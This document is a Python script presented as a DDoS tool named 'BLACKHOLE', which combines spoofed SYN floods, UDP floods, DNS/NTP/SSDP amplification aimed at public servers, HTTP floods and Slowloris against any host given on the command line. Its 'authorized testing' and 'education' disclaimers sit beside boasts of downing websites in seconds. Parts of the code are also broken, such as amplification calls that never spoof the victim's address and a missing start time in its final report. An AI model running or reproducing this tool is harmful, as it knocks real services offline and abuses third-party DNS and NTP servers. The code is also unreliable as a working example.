#!/usr/bin/env python3
"""
🔥 ULTIMATE DDoS WEAPON - "BLACKHOLE"
Most Dangerous Kali-Compatible DDoS Tool 
⚠️  AUTHORIZED PENETRATION TESTING ONLY ⚠️
Takes down websites in SECONDS with multi-vector amplification
"""

import socket
import threading
import random
import time
import struct
import sys
import argparse
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor
import multiprocessing
from datetime import datetime

class BlackholeDDoS:
    def __init__(self, target_host, target_port=80, threads=2000, duration=30):
        self.target_host = socket.gethostbyname(target_host)
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = {'packets': 0, 'bytes': 0, 'threads_active': 0}
        
        # Amplification lists (DNS, NTP, SSDP, Memcached servers)
        self.amp_servers = [
            # Public amplification targets (use responsibly)
            # DNS: 8.8.8.8:53, NTP: pool.ntp.org:123, etc.
        ]
        
        print(f"🎯 Target resolved: {self.target_host}:{self.target_port}")
        print(f"💀 Threads: {threads} | Duration: {duration}s")
        print("🚀 LAUNCHING BLACKHOLE ATTACK...\n")

    def log(self, msg):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def random_ip(self):
        return '.'.join(str(random.randint(1,254)) for _ in range(4))

    def syn_flood(self):
        """Layer 4 SYN Flood - 1M+ pkts/sec potential"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            return

        while self.running:
            # Craft SYN packet
            ip = IP(src=self.random_ip(), dst=self.target_host)
            tcp = TCP(sport=RandShort(), dport=self.target_port, flags='S', 
                     seq=RandInt(), window=1024)
            send(ip/tcp, verbose=0)
            self.stats['packets'] += 1
            self.stats['bytes'] += 40 + 20

    def udp_flood(self):
        """UDP Flood with large payloads"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(65500)
        
        while self.running:
            sock.sendto(bytes, (self.target_host, self.target_port))
            self.stats['packets'] += 1
            self.stats['bytes'] += len(bytes)

    def dns_amplification(self):
        """DNS Amplification (50x multiplier)"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\xff\x00\x01'
        
        # Spoof source to target
        while self.running:
            sock.sendto(dns_query, ('8.8.8.8', 53))  # Google DNS reflects ~50x
            self.stats['packets'] += 1

    def ntp_amplification(self):
        """NTP Monlist Amplification (500x multiplier!)"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ntp_packet = b'\x17\x00\x03\x2a' + (b'\x00'*4)
        
        while self.running:
            sock.sendto(ntp_packet, ('pool.ntp.org', 123))
            self.stats['packets'] += 1

    def ssdp_amplification(self):
        """SSDP Amplification (30x multiplier)"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ssdp = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n\r\n'
        
        while self.running:
            sock.sendto(ssdp, ('239.255.255.250', 1900))
            self.stats['packets'] += 1

    def http_flood(self):
        """HTTP/2 Rapid Flood"""
        import requests
        session = requests.Session()
        
        while self.running:
            try:
                session.get(f"http://{self.target_host}:{self.target_port}/", 
                           timeout=1, headers={'User-Agent': 'Mozilla/5.0'})
                self.stats['packets'] += 1
            except:
                pass

    def slowloris(self):
        """SlowLoris connection exhaustion"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target_host, self.target_port))
        
        sock.send(b"GET / HTTP/1.1\r\n")
        sock.send(b"Host: " + self.target_host.encode() + b"\r\n")
        
        sent_headers = 0
        while self.running and sent_headers < 5:
            sock.send(f"X-Forwarded-For: {self.random_ip()}\r\n".encode())
            sent_headers += 1
            time.sleep(15)

    def attack(self):
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # 50% SYN Flood (most effective)
            syn_threads = int(self.threads * 0.5)
            executor.submit(lambda: [self.syn_flood() for _ in range(syn_threads)])
            
            # 20% UDP Flood
            udp_threads = int(self.threads * 0.2)
            executor.submit(lambda: [self.udp_flood() for _ in range(udp_threads)])
            
            # 15% Amplification (DNS/NTP/SSDP)
            amp_threads = int(self.threads * 0.15)
            executor.submit(lambda: [self.dns_amplification() for _ in range(amp_threads//3)])
            executor.submit(lambda: [self.ntp_amplification() for _ in range(amp_threads//3)])
            executor.submit(lambda: [self.ssdp_amplification() for _ in range(amp_threads//3)])
            
            # 10% HTTP/SlowLoris
            http_threads = int(self.threads * 0.1)
            executor.submit(lambda: [self.http_flood() for _ in range(http_threads//2)])
            executor.submit(lambda: [self.slowloris() for _ in range(http_threads//2)])

        # Live stats
        while self.running and (time.time() - start_time < self.duration):
            elapsed = time.time() - start_time
            pps = self.stats['packets'] / elapsed
            mbps = self.stats['bytes'] / (elapsed * 1024 * 1024)
            
            self.log(f"💥 LIVE STATS | PPS: {pps:,.0f} | MB/s: {mbps:.2f} | "
                    f"Total Pkts: {self.stats['packets']:,} | Time: {elapsed:.0f}s")
            time.sleep(2)

        self.running = False

def main():
    parser = argparse.ArgumentParser(description="🕳️ BLACKHOLE - Ultimate DDoS Weapon")
    parser.add_argument("target", help="Target host/IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=2000, help="Thread count")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duration (seconds)")
    
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║  🔥 BLACKHOLE DDoS - Silent Professor ⚔ Er. Rahul Kumar Jha, B.E, CCEP, CRTOM 🔥 ║
    ║  ⚠️  Downs websites in SECONDS with 1M+ PPS 🛡 For Education Purpose only        ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    blackhole = BlackholeDDoS(args.target, args.port, args.threads, args.duration)
    
    try:
        blackhole.attack()
    except KeyboardInterrupt:
        blackhole.log("⏹️ EMERGENCY STOP using Ctrl + C")
    
    # Final report
    total_time = time.time() - blackhole.stats.get('start_time', 0)
    avg_pps = blackhole.stats['packets'] / total_time
    print(f"\n💀 ATTACK COMPLETE | Peak PPS: {avg_pps:,.0f} | Total: {blackhole.stats['packets']:,} pkts")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("❌ RUN AS ROOT: 👉 sudo python3 blackhole.py 🏆")
        sys.exit(1)
    
    main()
